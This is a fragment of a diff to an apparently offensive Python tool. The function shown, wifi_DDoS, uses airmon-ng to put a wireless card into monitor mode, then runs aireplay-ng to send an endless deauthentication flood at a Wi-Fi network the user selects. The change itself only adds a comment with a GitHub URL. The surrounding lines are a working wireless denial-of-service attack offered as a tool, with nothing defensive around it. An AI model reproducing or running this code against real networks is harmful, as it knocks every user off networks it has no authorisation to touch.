@@ -132,4 +132,6 @@ def wifi_DDoS():
     hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
     subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
     subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
+#https://github.com/GhostHX-Net/Net/edit/main/NetV2.py
+
 
